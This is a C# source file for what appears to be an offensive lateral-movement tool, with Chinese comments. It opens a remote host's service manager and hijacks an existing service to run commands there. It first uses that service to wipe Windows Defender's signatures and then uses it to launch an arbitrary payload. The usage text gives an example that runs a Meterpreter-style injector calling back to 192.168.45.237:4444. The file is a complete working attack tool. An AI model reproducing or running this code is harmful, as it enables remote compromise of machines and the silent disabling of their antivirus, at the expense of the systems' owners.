using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace lat
{
    class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(
            IntPtr hService,
            uint dwServiceType,
            int dwStartType,
            int dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            string lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword,
            string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        static void Main(string[] args)
        {
            // 用法：lat.exe <目标主机> <服务名> <完整命令>
            if (args.Length < 3)
            {
                Console.WriteLine("Usage: lat.exe <targetHost> <serviceName> <fullCommand>");
                Console.WriteLine("Example (PowerShell):");
                Console.WriteLine("  C:\\windows\\temp\\lat64.exe file01 SensorService \"`\"C:\\Met64Inject.exe`\" 192.168.45.237 4444 Spoolsv\"");
                Console.WriteLine("  (The inner quotes ensure path with spaces is handled correctly)");
                return;
            }

            string target = args[0];
            string serviceName = args[1];
            string finalPayload = args[2];  // 最终要执行的可执行文件及参数

            // 定义 Defender 签名删除命令
            string defenderCmd = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";

            // 连接远程 SCM
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F); // SC_MANAGER_ALL_ACCESS
            if (SCMHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] OpenSCManager failed. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Connected to SCM on " + target);

            // 打开目标服务
            IntPtr schService = OpenService(SCMHandle, serviceName, 0xF01FF); // SERVICE_ALL_ACCESS
            if (schService == IntPtr.Zero)
            {
                Console.WriteLine("[-] OpenService failed. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Opened service: " + serviceName);

            // ---------- 第一步：移除 Defender 签名 ----------
            Console.WriteLine("[*] Step 1: Removing Defender signatures...");
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, defenderCmd,
                                                null, null, null, null, null, null);
            if (!bResult)
            {
                Console.WriteLine("[-] ChangeServiceConfig (Defender) failed. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Service binary path changed to: " + defenderCmd);

            bResult = StartService(schService, 0, null);
            if (!bResult)
            {
                int err = Marshal.GetLastWin32Error();
                if (err == 1053)
                    Console.WriteLine("[*] Defender removal process started (expected timeout 1053).");
                else
                    Console.WriteLine("[-] StartService (Defender) failed. Error: " + err);
            }
            else
            {
                Console.WriteLine("[+] Defender removal service started successfully.");
            }

            // 等待 Defender 完成清除（通常几秒）
            Console.WriteLine("[*] Waiting 10 seconds for signature removal to complete...");
            Thread.Sleep(10000);

            // ---------- 第二步：启动真正的 payload ----------
            Console.WriteLine("[*] Step 2: Launching payload...");
            bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, finalPayload,
                                           null, null, null, null, null, null);
            if (!bResult)
            {
                Console.WriteLine("[-] ChangeServiceConfig (Payload) failed. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Service binary path changed to: " + finalPayload);
            // 注意：控制台可能不显示引号，但实际存储的字符串包含引号

            bResult = StartService(schService, 0, null);
            if (!bResult)
            {
                int err = Marshal.GetLastWin32Error();
                if (err == 1053)
                    Console.WriteLine("[*] Payload started (expected timeout 1053).");
                else
                    Console.WriteLine("[-] StartService (Payload) failed. Error: " + err);
            }
            else
            {
                Console.WriteLine("[+] Payload service started successfully.");
            }

            Console.WriteLine("[*] Lateral movement completed.");
        }
    }
}